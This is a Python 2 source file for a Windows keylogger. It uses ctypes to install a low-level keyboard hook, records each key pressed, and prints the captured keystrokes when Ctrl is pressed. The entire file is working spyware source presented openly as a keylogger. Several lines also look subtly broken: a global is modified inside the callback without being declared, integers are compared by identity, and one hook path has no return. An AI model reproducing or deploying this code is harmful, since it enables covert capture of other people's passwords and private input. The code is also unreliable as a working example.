# -*- coding: utf-8 -*-
"""
Created on Sat Sep 17 01:16:23 2016

@author: John Troony
"""

import sys
from ctypes import *
from ctypes.wintypes import MSG
from ctypes.wintypes import DWORD

user32 = windll.user32
kernel32 = windll.kernel32

WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100

CTRL_CODE = 162


class KeyLogger:
    keystrokesx = ''

    def __init__(self):
        self.lUser32 = user32
        self.hooked = None

    def installHookProc(self, pointer):
        self.hooked = self.lUser32.SetWindowsHookExA(WH_KEYBOARD_LL, pointer,
                                                     kernel32.GetModuleHandleW(None), 0)
        if not self.hooked:
            return False
        return True

    def uninstallHookProc(self):
        if self.hooked is None:
            return
        self.lUser32.UnhookWindowsHookEx(self.hooked)
        self.hooked = None


def getFPTR(fn):
    CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
    return CMPFUNC(fn)


def hookProc(nCode, wParam, lParam):
    if wParam is not WM_KEYDOWN:
        return user32.CallNextHookEx(keyLogger.hooked, nCode, wParam, lParam)
    hookedKey = chr(lParam[0])
    keystrokesx += hookedKey

    if(CTRL_CODE == int(lParam[0])):
        print keystrokesx
        print "Ctrl pressed, call uninstallHook()"
        keyLogger.uninstallHookProc()
        sys.exit(-1)
        return user32.CallNextHookEx(keyLogger.hooked, nCode, wParam, lParam)


def startKeyLog():
    msg = MSG()
    user32.GetMessageA(byref(msg), 0, 0, 0)

keyLogger = KeyLogger()  # start of hook process
pointer = getFPTR(hookProc)

if keyLogger.installHookProc(pointer):
    print "installed keyLogger"

startKeyLog()
